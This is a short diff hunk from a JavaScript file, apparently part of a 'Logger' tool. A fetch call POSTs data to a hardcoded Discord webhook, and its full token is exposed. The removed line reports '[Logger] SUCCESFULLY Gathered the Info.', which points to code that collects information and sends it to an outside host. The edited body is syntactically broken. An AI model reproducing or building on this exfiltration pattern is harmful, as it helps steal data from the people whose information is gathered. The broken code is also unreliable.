@@ -180,8 +180,9 @@
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
        method: 'POST',
-       body: formData
-         content: `[Logger] SUCCESFULLY Gathered the Info.`,
+       body: formData JSON.stringify({
+    content: `type your message here`,
+  })
       })
      .then(function(response) {
       console.log(
